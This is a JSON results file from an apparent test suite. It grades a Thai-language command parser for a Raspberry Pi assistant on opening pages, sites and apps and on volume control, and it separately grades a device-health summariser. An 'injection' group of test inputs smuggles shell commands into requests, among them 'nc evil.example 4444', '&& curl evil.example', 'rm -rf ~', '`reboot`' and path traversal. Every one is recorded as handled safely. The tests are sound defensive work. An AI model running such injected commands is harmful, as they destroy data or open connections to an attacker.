@@ -1,0 +1,888 @@
+{
+ "skill4": {
+  "rows": [
+   {
+    "group": "commands",
+    "text": "เปิดผู้ช่วย AI",
+    "expect": "open_page {'page': 'workspace'}",
+    "got": "open_page {'page': 'workspace'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ไปหน้าผู้ช่วยหน่อย",
+    "expect": "open_page {'page': 'workspace'}",
+    "got": "open_page {'page': 'workspace'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เข้าหน้าแชทครับ",
+    "expect": "open_page {'page': 'workspace'}",
+    "got": "open_page {'page': 'workspace'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เปิดหน้าไฟล์",
+    "expect": "open_page {'page': 'files'}",
+    "got": "open_page {'page': 'files'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ไปไฟล์ของฉันหน่อย",
+    "expect": "open_page {'page': 'files'}",
+    "got": "open_page {'page': 'files'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ขอเปิดไฟล์ของฉันครับ",
+    "expect": "open_page {'page': 'files'}",
+    "got": "open_page {'page': 'files'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เปิด skill",
+    "expect": "open_page {'page': 'skills'}",
+    "got": "open_page {'page': 'skills'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ไปหน้าสกิลหน่อย",
+    "expect": "open_page {'page': 'skills'}",
+    "got": "open_page {'page': 'skills'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ขอดูสกิลทั้งหมด",
+    "expect": "open_page {'page': 'skills'}",
+    "got": "open_page {'page': 'skills'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เปิดความเป็นส่วนตัวหน่อย",
+    "expect": "open_page {'page': 'privacy'}",
+    "got": "open_page {'page': 'privacy'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ไปหน้า privacy",
+    "expect": "open_page {'page': 'privacy'}",
+    "got": "open_page {'page': 'privacy'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ขอเข้าความเป็นส่วนตัวครับ",
+    "expect": "open_page {'page': 'privacy'}",
+    "got": "open_page {'page': 'privacy'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เปิดสถานะเครื่อง",
+    "expect": "open_page {'page': 'health'}",
+    "got": "open_page {'page': 'health'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ไปหน้าสุขภาพเครื่องหน่อย",
+    "expect": "open_page {'page': 'health'}",
+    "got": "open_page {'page': 'health'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ขอดูสุขภาพเครื่องครับ",
+    "expect": "open_page {'page': 'health'}",
+    "got": "open_page {'page': 'health'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เปิดการตั้งค่า",
+    "expect": "open_page {'page': 'settings'}",
+    "got": "open_page {'page': 'settings'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เปิด settings หน่อย",
+    "expect": "open_page {'page': 'settings'}",
+    "got": "open_page {'page': 'settings'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ไปตั้งค่าครับ",
+    "expect": "open_page {'page': 'settings'}",
+    "got": "open_page {'page': 'settings'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เปิดยูทูปให้หน่อย",
+    "expect": "open_url {'site': 'youtube'}",
+    "got": "open_url {'site': 'youtube'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ไป youtube",
+    "expect": "open_url {'site': 'youtube'}",
+    "got": "open_url {'site': 'youtube'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เข้ายูทิวบ์ครับ",
+    "expect": "open_url {'site': 'youtube'}",
+    "got": "open_url {'site': 'youtube'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เปิดอีเมล",
+    "expect": "open_url {'site': 'gmail'}",
+    "got": "open_url {'site': 'gmail'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เข้าจีเมลหน่อย",
+    "expect": "open_url {'site': 'gmail'}",
+    "got": "open_url {'site': 'gmail'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ขอเปิด gmail ครับ",
+    "expect": "open_url {'site': 'gmail'}",
+    "got": "open_url {'site': 'gmail'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เปิดเว็บกูเกิล",
+    "expect": "open_url {'site': 'google'}",
+    "got": "open_url {'site': 'google'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ไป google หน่อย",
+    "expect": "open_url {'site': 'google'}",
+    "got": "open_url {'site': 'google'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เข้ากูเกิลครับ",
+    "expect": "open_url {'site': 'google'}",
+    "got": "open_url {'site': 'google'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เปิดวิกิ",
+    "expect": "open_url {'site': 'wikipedia'}",
+    "got": "open_url {'site': 'wikipedia'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ไปวิกิพีเดียหน่อย",
+    "expect": "open_url {'site': 'wikipedia'}",
+    "got": "open_url {'site': 'wikipedia'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เข้า wikipedia ครับ",
+    "expect": "open_url {'site': 'wikipedia'}",
+    "got": "open_url {'site': 'wikipedia'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เปิด maps",
+    "expect": "open_url {'site': 'maps'}",
+    "got": "open_url {'site': 'maps'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เปิดแผนที่กูเกิลหน่อย",
+    "expect": "open_url {'site': 'maps'}",
+    "got": "open_url {'site': 'google'} (ถามก่อน)",
+    "result": "wrong_asked"
+   },
+   {
+    "group": "commands",
+    "text": "ไปกูเกิลแมพครับ",
+    "expect": "open_url {'site': 'maps'}",
+    "got": "open_url {'site': 'maps'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เปิดบราวเซอร์",
+    "expect": "open_app {'app': 'browser'}",
+    "got": "open_app {'app': 'browser'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ขอเปิดโครเมียมครับ",
+    "expect": "open_app {'app': 'browser'}",
+    "got": "open_app {'app': 'browser'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เปิดเว็บเบราว์เซอร์หน่อย",
+    "expect": "open_app {'app': 'browser'}",
+    "got": "open_app {'app': 'browser'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เปิดเทอมินัล",
+    "expect": "open_app {'app': 'terminal'}",
+    "got": "open_app {'app': 'terminal'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เปิดแอป terminal หน่อย",
+    "expect": "open_app {'app': 'terminal'}",
+    "got": "open_app {'app': 'terminal'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ขอ terminal ครับ",
+    "expect": "open_app {'app': 'terminal'}",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "missed"
+   },
+   {
+    "group": "commands",
+    "text": "เปิดตัวจัดการไฟล์ครับ",
+    "expect": "open_app {'app': 'filemanager'}",
+    "got": "open_app {'app': 'filemanager'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เปิดโฟลเดอร์หน่อย",
+    "expect": "open_app {'app': 'filemanager'}",
+    "got": "open_app {'app': 'filemanager'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เปิดแอปจัดการไฟล์",
+    "expect": "open_app {'app': 'filemanager'}",
+    "got": "open_app {'app': 'filemanager'}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เสียงสามสิบ",
+    "expect": "set_volume {'percent': 30}",
+    "got": "set_volume {'percent': 30}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ปรับเสียงไปที่ 80",
+    "expect": "set_volume {'percent': 80}",
+    "got": "set_volume {'percent': 80}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ตั้งเสียงเป็นยี่สิบห้าครับ",
+    "expect": "set_volume {'percent': 25}",
+    "got": "set_volume {'percent': 25}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เพิ่มเสียงหน่อย",
+    "expect": "change_volume {'step': 10}",
+    "got": "change_volume {'step': 10}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ดังขึ้นอีกหน่อย",
+    "expect": "change_volume {'step': 10}",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "missed"
+   },
+   {
+    "group": "commands",
+    "text": "ขอเสียงดังขึ้นครับ",
+    "expect": "change_volume {'step': 10}",
+    "got": "change_volume {'step': 10}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ลดเสียงหน่อย",
+    "expect": "change_volume {'step': -10}",
+    "got": "change_volume {'step': -10}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เบาลงอีกนิด",
+    "expect": "change_volume {'step': -10}",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "missed"
+   },
+   {
+    "group": "commands",
+    "text": "ขอเสียงเบาลงครับ",
+    "expect": "change_volume {'step': -10}",
+    "got": "change_volume {'step': -10}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ปิดเสียงเลย",
+    "expect": "mute {}",
+    "got": "mute {}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ขอปิดเสียงหน่อย",
+    "expect": "mute {}",
+    "got": "mute {}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ปิดเสียงลำโพง",
+    "expect": "mute {}",
+    "got": "mute {}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "เปิดเสียงด้วย",
+    "expect": "unmute {}",
+    "got": "unmute {}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "ขอเปิดเสียงคืนครับ",
+    "expect": "unmute {}",
+    "got": "unmute {}",
+    "result": "correct"
+   },
+   {
+    "group": "commands",
+    "text": "unmute หน่อย",
+    "expect": "unmute {}",
+    "got": "unmute {}",
+    "result": "correct"
+   },
+   {
+    "group": "typos",
+    "text": "เปิดยูทูปบ",
+    "expect": "open_url {'site': 'youtube'}",
+    "got": "open_url {'site': 'youtube'}",
+    "result": "correct"
+   },
+   {
+    "group": "typos",
+    "text": "เปิดจีเมลล์",
+    "expect": "open_url {'site': 'gmail'}",
+    "got": "open_url {'site': 'gmail'}",
+    "result": "correct"
+   },
+   {
+    "group": "typos",
+    "text": "เปิด gogle",
+    "expect": "open_url {'site': 'google'}",
+    "got": "open_url {'site': 'google'}",
+    "result": "correct"
+   },
+   {
+    "group": "typos",
+    "text": "เปิดวิกิพีเดีบ",
+    "expect": "open_url {'site': 'wikipedia'}",
+    "got": "open_url {'site': 'wikipedia'}",
+    "result": "correct"
+   },
+   {
+    "group": "typos",
+    "text": "เปิดบราวเซอร",
+    "expect": "open_app {'app': 'browser'}",
+    "got": "open_app {'app': 'browser'}",
+    "result": "correct"
+   },
+   {
+    "group": "typos",
+    "text": "เปิดเทอร์มินลั",
+    "expect": "open_app {'app': 'terminal'}",
+    "got": "open_app {'app': 'terminal'}",
+    "result": "correct"
+   },
+   {
+    "group": "typos",
+    "text": "เปิดตั้งค่่า",
+    "expect": "open_page {'page': 'settings'}",
+    "got": "open_page {'page': 'settings'}",
+    "result": "correct"
+   },
+   {
+    "group": "typos",
+    "text": "เปิดสุขภาพเคื่อง",
+    "expect": "open_page {'page': 'health'}",
+    "got": "open_page {'page': 'health'}",
+    "result": "correct"
+   },
+   {
+    "group": "typos",
+    "text": "เปิด privcy",
+    "expect": "open_page {'page': 'privacy'}",
+    "got": "open_page {'page': 'privacy'}",
+    "result": "correct"
+   },
+   {
+    "group": "typos",
+    "text": "เปิดโฟลเดอ",
+    "expect": "open_app {'app': 'filemanager'}",
+    "got": "open_app {'app': 'filemanager'} (ถามก่อน)",
+    "result": "asked"
+   },
+   {
+    "group": "not_commands",
+    "text": "เปิดโลกกว้างกับการอ่าน",
+    "expect": "ไม่ใช่คำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "correct"
+   },
+   {
+    "group": "not_commands",
+    "text": "ไปโรงเรียนกี่โมง",
+    "expect": "ไม่ใช่คำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "correct"
+   },
+   {
+    "group": "not_commands",
+    "text": "เข้าห้องน้ำก่อนนะ",
+    "expect": "ไม่ใช่คำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "correct"
+   },
+   {
+    "group": "not_commands",
+    "text": "เสียงเพลงนี้เพราะดี",
+    "expect": "ไม่ใช่คำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "correct"
+   },
+   {
+    "group": "not_commands",
+    "text": "ทำไมเสียงแตก",
+    "expect": "ไม่ใช่คำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "correct"
+   },
+   {
+    "group": "not_commands",
+    "text": "เมื่อกี้เสียงดังอะไร",
+    "expect": "ไม่ใช่คำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "correct"
+   },
+   {
+    "group": "not_commands",
+    "text": "เบาใจได้แล้ว",
+    "expect": "ไม่ใช่คำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "correct"
+   },
+   {
+    "group": "not_commands",
+    "text": "ช่วยสรุปข่าววันนี้หน่อย",
+    "expect": "ไม่ใช่คำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "correct"
+   },
+   {
+    "group": "not_commands",
+    "text": "ช่วยคิดชื่อร้านให้หน่อย",
+    "expect": "ไม่ใช่คำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "correct"
+   },
+   {
+    "group": "not_commands",
+    "text": "ผู้ช่วยทำอะไรได้บ้าง",
+    "expect": "ไม่ใช่คำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "correct"
+   },
+   {
+    "group": "not_commands",
+    "text": "ไฟล์ของฉันหายไปไหน",
+    "expect": "ไม่ใช่คำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "correct"
+   },
+   {
+    "group": "not_commands",
+    "text": "ยูทูบเบอร์คนไหนดัง",
+    "expect": "ไม่ใช่คำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "correct"
+   },
+   {
+    "group": "not_commands",
+    "text": "แผนที่ประเทศไทยมีกี่ภาค",
+    "expect": "ไม่ใช่คำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "correct"
+   },
+   {
+    "group": "not_commands",
+    "text": "เปิดเผยข้อมูลส่วนตัวได้ไหม",
+    "expect": "ไม่ใช่คำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "correct"
+   },
+   {
+    "group": "not_commands",
+    "text": "ปิดเทอมเมื่อไร",
+    "expect": "ไม่ใช่คำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "correct"
+   },
+   {
+    "group": "not_commands",
+    "text": "ตั้งใจเรียนนะ",
+    "expect": "ไม่ใช่คำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "correct"
+   },
+   {
+    "group": "not_commands",
+    "text": "เตือนปิดเสียงตอนประชุมบ่ายสาม",
+    "expect": "ไม่ใช่คำสั่ง",
+    "got": "mute {}",
+    "result": "wrong"
+   },
+   {
+    "group": "not_commands",
+    "text": "แรมเหลือเท่าไร",
+    "expect": "ไม่ใช่คำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "correct"
+   },
+   {
+    "group": "not_commands",
+    "text": "เพิ่มเพื่อนในไลน์ยังไง",
+    "expect": "ไม่ใช่คำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "correct"
+   },
+   {
+    "group": "not_commands",
+    "text": "ลดน้ำหนักยังไงดี",
+    "expect": "ไม่ใช่คำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "correct"
+   },
+   {
+    "group": "injection",
+    "text": "เปิดกูเกิล | nc evil.example 4444",
+    "expect": "ไม่มีส่วนของข้อความหลุดเข้าคำสั่ง",
+    "got": "open_url {'site': 'google'} → ['xdg-open', 'https://www.google.com']",
+    "result": "safe"
+   },
+   {
+    "group": "injection",
+    "text": "ไปที่ http://192.168.1.10/steal?x=1",
+    "expect": "ไม่มีส่วนของข้อความหลุดเข้าคำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "safe"
+   },
+   {
+    "group": "injection",
+    "text": "เปิดแอป /bin/sh",
+    "expect": "ไม่มีส่วนของข้อความหลุดเข้าคำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "safe"
+   },
+   {
+    "group": "injection",
+    "text": "ปรับเสียง 30 && curl evil.example",
+    "expect": "ไม่มีส่วนของข้อความหลุดเข้าคำสั่ง",
+    "got": "set_volume {'percent': 30} → ['wpctl', 'set-volume', '@DEFAULT_AUDIO_SINK@', '30%']",
+    "result": "safe"
+   },
+   {
+    "group": "injection",
+    "text": "เปิดหน้า ../../../root",
+    "expect": "ไม่มีส่วนของข้อความหลุดเข้าคำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "safe"
+   },
+   {
+    "group": "injection",
+    "text": "เปิดยูทูบ `reboot`",
+    "expect": "ไม่มีส่วนของข้อความหลุดเข้าคำสั่ง",
+    "got": "open_url {'site': 'youtube'} → ['xdg-open', 'https://www.youtube.com']",
+    "result": "safe"
+   },
+   {
+    "group": "injection",
+    "text": "เปิดเทอร์มินัล -e 'rm -rf ~'",
+    "expect": "ไม่มีส่วนของข้อความหลุดเข้าคำสั่ง",
+    "got": "open_app {'app': 'terminal'} → ['gtk-launch', 'lxterminal.desktop']",
+    "result": "safe"
+   },
+   {
+    "group": "injection",
+    "text": "เปิด data:text/html,<script>alert(1)</script>",
+    "expect": "ไม่มีส่วนของข้อความหลุดเข้าคำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "safe"
+   },
+   {
+    "group": "injection",
+    "text": "ปรับเสียง ๑๐๐๐",
+    "expect": "ไม่มีส่วนของข้อความหลุดเข้าคำสั่ง",
+    "got": "ไม่ใช่คำสั่ง",
+    "result": "safe"
+   },
+   {
+    "group": "injection",
+    "text": "เปิด wikipedia.org.evil.example",
+    "expect": "ไม่มีส่วนของข้อความหลุดเข้าคำสั่ง",
+    "got": "open_url {'site': 'wikipedia'} → ['xdg-open', 'https://th.wikipedia.org']",
+    "result": "safe"
+   }
+  ],
+  "summary": {
+   "commands_total": 57,
+   "commands_correct": 53,
+   "commands_correct_asked": 0,
+   "commands_missed": 3,
+   "commands_wrong": 1,
+   "commands_correct_rate": 0.9298245614035088,
+   "typos_total": 10,
+   "typos_correct_asked": 1,
+   "typos_correct_sure": 9,
+   "typos_missed": 0,
+   "typos_wrong_without_asking": 0,
+   "not_commands_total": 20,
+   "not_commands_caught": 1,
+   "unintended": 1,
+   "unintended_rate": 0.011494252873563218,
+   "unintended_denominator": 87,
+   "injection_total": 10,
+   "injection_unsafe": 0,
+   "pass": {
+    "commands_correct": false,
+    "unintended": false,
+    "typos": true,
+    "injection": true
+   }
+  }
+ },
+ "skill5": {
+  "rows": [
+   {
+    "id": "healthy",
+    "headline": "ไม่พบปัญหาจากค่าที่อ่านได้",
+    "headline_ok": true,
+    "unknown_ok": true,
+    "invented": [],
+    "called_normal": []
+   },
+   {
+    "id": "healthy-warm",
+    "headline": "ไม่พบปัญหาจากค่าที่อ่านได้",
+    "headline_ok": true,
+    "unknown_ok": true,
+    "invented": [],
+    "called_normal": []
+   },
+   {
+    "id": "undervoltage",
+    "headline": "พบปัญหา: ไฟเลี้ยงไม่พอ",
+    "headline_ok": true,
+    "unknown_ok": true,
+    "invented": [],
+    "called_normal": []
+   },
+   {
+    "id": "hot",
+    "headline": "พบปัญหา: เครื่องร้อนเกิน",
+    "headline_ok": true,
+    "unknown_ok": true,
+    "invented": [],
+    "called_normal": []
+   },
+   {
+    "id": "hot-edge-79",
+    "headline": "ไม่พบปัญหาจากค่าที่อ่านได้",
+    "headline_ok": true,
+    "unknown_ok": true,
+    "invented": [],
+    "called_normal": []
+   },
+   {
+    "id": "hot-edge-80",
+    "headline": "พบปัญหา: เครื่องร้อนเกิน",
+    "headline_ok": true,
+    "unknown_ok": true,
+    "invented": [],
+    "called_normal": []
+   },
+   {
+    "id": "low-ram",
+    "headline": "พบปัญหา: หน่วยความจำเหลือน้อย",
+    "headline_ok": true,
+    "unknown_ok": true,
+    "invented": [],
+    "called_normal": []
+   },
+   {
+    "id": "ram-edge-1023",
+    "headline": "พบปัญหา: หน่วยความจำเหลือน้อย",
+    "headline_ok": true,
+    "unknown_ok": true,
+    "invented": [],
+    "called_normal": []
+   },
+   {
+    "id": "ram-edge-1024",
+    "headline": "ไม่พบปัญหาจากค่าที่อ่านได้",
+    "headline_ok": true,
+    "unknown_ok": true,
+    "invented": [],
+    "called_normal": []
+   },
+   {
+    "id": "storage-warn",
+    "headline": "พบปัญหา: พื้นที่ใกล้เต็ม",
+    "headline_ok": true,
+    "unknown_ok": true,
+    "invented": [],
+    "called_normal": []
+   },
+   {
+    "id": "storage-full",
+    "headline": "พบปัญหา: พื้นที่ใกล้เต็ม",
+    "headline_ok": true,
+    "unknown_ok": true,
+    "invented": [],
+    "called_normal": []
+   },
+   {
+    "id": "hot-and-low-ram",
+    "headline": "พบปัญหา: เครื่องร้อนเกิน และ หน่วยความจำเหลือน้อย",
+    "headline_ok": true,
+    "unknown_ok": true,
+    "invented": [],
+    "called_normal": []
+   },
+   {
+    "id": "power-and-hot",
+    "headline": "พบปัญหา: ไฟเลี้ยงไม่พอ และ เครื่องร้อนเกิน",
+    "headline_ok": true,
+    "unknown_ok": true,
+    "invented": [],
+    "called_normal": []
+   },
+   {
+    "id": "everything-wrong",
+    "headline": "พบปัญหา: ไฟเลี้ยงไม่พอ และ เครื่องร้อนเกิน และ หน่วยความจำเหลือน้อย และ พื้นที่ใกล้เต็ม",
+    "headline_ok": true,
+    "unknown_ok": true,
+    "invented": [],
+    "called_normal": []
+   },
+   {
+    "id": "no-temp",
+    "headline": "ไม่พบปัญหาจากค่าที่อ่านได้",
+    "headline_ok": true,
+    "unknown_ok": true,
+    "invented": [],
+    "called_normal": []
+   },
+   {
+    "id": "power-unknown",
+    "headline": "ไม่พบปัญหาจากค่าที่อ่านได้",
+    "headline_ok": true,
+    "unknown_ok": true,
+    "invented": [],
+    "called_normal": []
+   },
+   {
+    "id": "pi4-like",
+    "headline": "ไม่พบปัญหาจากค่าที่อ่านได้",
+    "headline_ok": true,
+    "unknown_ok": true,
+    "invented": [],
+    "called_normal": []
+   },
+   {
+    "id": "hot-while-power-unknown",
+    "headline": "พบปัญหา: เครื่องร้อนเกิน",
+    "headline_ok": true,
+    "unknown_ok": true,
+    "invented": [],
+    "called_normal": []
+   },
+   {
+    "id": "not-a-pi",
+    "headline": "อ่านค่าสถานะของเครื่องนี้ไม่ได้เกือบทั้งหมด — น่าจะไม่ได้รันบน Raspberry Pi",
+    "headline_ok": true,
+    "unknown_ok": true,
+    "invented": [],
+    "called_normal": []
+   },
+   {
+    "id": "checks-missing",
+    "headline": "อ่านค่าสถานะของเครื่องนี้ไม่ได้เกือบทั้งหมด — น่าจะไม่ได้รันบน Raspberry Pi",
+    "headline_ok": true,
+    "unknown_ok": true,
+    "invented": [],
+    "called_normal": []
+   }
+  ],
+  "summary": {
+   "states": 20,
+   "headline_correct": 20,
+   "unknown_correct": 20,
+   "invented_numbers": 0,
+   "unknown_called_normal": 0,
+   "pass": {
+    "headline": true,
+    "unknown": true,
+    "invented": true,
+    "called_normal": true
+   }
+  }
+ }
+}
